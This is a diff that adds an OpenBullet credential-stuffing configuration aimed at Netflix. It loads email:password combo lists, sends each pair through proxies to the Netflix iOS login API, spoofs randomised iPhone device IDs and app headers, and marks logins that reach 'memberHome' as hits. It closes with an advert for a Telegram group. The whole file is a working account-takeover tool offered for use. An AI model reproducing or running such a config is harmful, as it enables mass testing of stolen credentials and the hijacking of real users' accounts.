@@ -1,0 +1,72 @@
+[SETTINGS]
+{
+  "Name": "Netflix API2",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-05T18:25:59.9102768-07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Antonello54",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION URLEncode "{\"action\":\"loginAction\",\"fields\":{\"userLoginId\":\"<USER>\",\"rememberMe\":\"true\",\"password\":\"<PASS>\"},\"verb\":\"POST\",\"mode\":\"login\",\"flow\":\"appleSignUp\"}" -> VAR "login" 
+
+FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "aae" 
+
+FUNCTION RandomNum "1" "11" -> VAR "rda" 
+
+FUNCTION RandomNum "200" "999" -> VAR "aa" 
+
+REQUEST POST "https://ios.prod.ftl.netflix.com/iosui/user/12.17" 
+  CONTENT "appInternalVersion=12.17.0&appVersion=12.17.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22clipsEnabled%22%3A%22false%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22previewsBrandingEnabled%22%3A%22true%22%2C%22seasonRenewalPostPlayEnabled%22%3A%22true%22%2C%22aroGalleriesEnabled%22%3A%22true%22%2C%22interactiveFeatureSugarPuffsEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22isDPShortPreviewEnabled%22%3Afalse%2C%22isDPAutoPlayIntoTitleEnabled%22%3Afalse%2C%22billboardEnabled%22%3A%22true%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22interactiveDataGatewayEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22previewsRowEnabled%22%3A%22true%22%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22isDPaudioSilencedByDefault%22%3Afalse%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22characterBarOnPhoneEnabled%22%3A%22true%22%2C%22contentWarningEnabled%22%3A%22true%22%2C%22postplayProductizationEnabled%22%3A%22true%22%2C%22bigRowEnabled%22%3A%22true%22%2C%22videoMerchInDPEnabled%22%3A%22false%22%2C%22interactiveFeatureAppUpdateDialogueEnabled%22%3A%22false%22%2C%22familiarityUIEnabled%22%3A%22false%22%2C%22bigrowNewUIEnabled%22%3A%22false%22%2C%22isAccountProfileLinkEnabled%22%3Afalse%2C%22interactiveFeatureTemplatesPrePlayEnabled%22%3A%22true%22%2C%22interactiveFeatureSugarPuffsPreplayEnabled%22%3A%22true%22%2C%22interactiveFeatureTemplatesEnabled%22%3A%22true%22%2C%22motionCharacterEnabled%22%3A%22true%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22roarEnabled%22%3A%22true%22%2C%22topTenListEnabled%22%3A%22false%22%2C%22mobileCollectionsEnabled%22%3A%22false%22%2C%22previewsInBillboardEnabled%22%3A%22false%22%2C%22interactiveFeatureMinecraftEnabled%22%3A%22true%22%2C%22isCreatorHomeForRMEnabled%22%3A%22true%22%2C%22kidsParityLolomoDefaultsEnabled%22%3A%22false%22%2C%22titleGroupsRowPatchedEnabled%22%3A%22false%22%2C%22isDPInlineMerchEnabled%22%3Afalse%2C%22interactiveFeatureYouVsWildEnabled%22%3A%22true%22%2C%22mobileCollectionsTitleGroupsEnabled%22%3A%22false%22%2C%22kidsTrailers%22%3Atrue%2C%22isDPMerchButtonEnabled%22%3Afalse%7D&device_type=NFAPPL-02-&esn=NFAPPL-02-IPHONE<rda>%3D1-EB0874<aae>F1E4<aae>0F3034F05DF19404<aae>11&idiom=phone&iosVersion=13.3.1&isTablet=false&kids=false&languages=en-US&locale=en-US&maxDeviceWidth=375&method=call&model=saget&modelType=IPHONE8-1&odpAware=true&param=<login>&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "X-Netflix.Argo.abTests: 22<aa>:6|1<aa>9:5" 
+  HEADER "X-Netflix.client.appVersion: 12.17.0" 
+  HEADER "X-Netflix.Argo.NFNSM: 9" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Language: en-CA;q=1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Netflix.esn: NFAPPL-02-IPHONE8=1-EB0874<aae>F1E4<aae>0F3034F05DF19404<aae>11" 
+  HEADER "X-Netflix.client.idiom: phone" 
+  HEADER "X-Netflix.Request.Routing: {\"path\":\"/nq/iosui/argo/~12.17.0/user\",\"control_tag\":\"iosui_argo\"}" 
+  HEADER "User-Agent: Argo/12.17.0 (iPhone; iOS 13.3.1; Scale/2.00)" 
+  HEADER "X-Netflix.request.client.user.guid: _fake-guid-for-activate" 
+  HEADER "X-Netflix.client.type: argo" 
+  HEADER "X-Netflix.Request.Attempt: 1" 
+  HEADER "X-Netflix.client.iosVersion: 13.3.1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"mode\":\"login" 
+    KEY "unrecognized_email_consumption_only" 
+  KEYCHAIN Success OR 
+    KEY "mode\":\"memberHome" 
+
+#About FUNCTION Constant "t.me/TeamDemon" -> CAP "Join Telegram Channel"
